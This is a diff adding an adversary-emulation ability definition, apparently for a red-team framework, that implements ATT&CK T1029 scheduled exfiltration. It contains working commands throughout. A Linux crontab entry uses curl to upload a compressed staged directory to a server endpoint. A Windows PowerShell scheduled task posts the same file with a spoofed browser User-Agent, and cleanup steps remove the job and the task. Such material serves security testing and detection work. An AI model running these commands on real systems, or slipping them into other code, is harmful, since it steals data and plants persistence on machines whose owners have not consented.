@@ -1,0 +1,49 @@
+- id: 110cea7a-5b03-4443-92ee-7ccefaead451
+  name: Scheduled Exfiltration
+  description: This ability exfiltrates the staged directory at a scheduled time.
+  tactic: exfiltration
+  technique:
+    attack_id: T1029
+    name: Scheduled Transfer
+  platforms:
+    linux:
+      sh:
+        command: |
+          crontab -l > /tmp/origcron;
+          crontab -l > /tmp/mycron;
+          echo "0 12 * * * curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;
+          crontab /tmp/mycron;
+        cleanup: |
+          rm /tmp/mycron;
+          crontab /tmp/origcron;
+          rm /tmp/origcron;
+    windows:
+      psh:
+        command: |
+          $commandString = '$fieldName = \"#{host.dir.compress}";
+          $filePath = \"#{host.dir.compress}";
+          $url = \"#{server}/file/upload\";
+          Add-Type -AssemblyName \"System.Net.Http\";
+
+          $client = New-Object System.Net.Http.HttpClient;
+          $content = New-Object System.Net.Http.MultipartFormDataContent;
+          $fileStream = [System.IO.File]::OpenRead($filePath);
+          $fileName = [System.IO.Path]::GetFileName($filePath);
+          $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+
+          $xRequestIdHeader = \"X-Request-Id\";
+          $xRequestIdField = $env:COMPUTERNAME + \"-#{paw}\";
+          $content.Add($fileContent, $fieldName, $fileName);
+          $client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);
+
+          $userAgentHeader = \"User-Agent\";
+          $userAgentField = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\";
+          $client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);
+          $result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';
+
+          $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$commandString";
+          $trigger = New-ScheduledTaskTrigger -Once -At 12pm;
+
+          Register-ScheduledTask -TaskName "Scheduled exfiltration" -Trigger $trigger -Action $action;
+        cleanup: |
+          Unregister-ScheduledTask -TaskName "Scheduled exfiltration" -Confirm:$false;
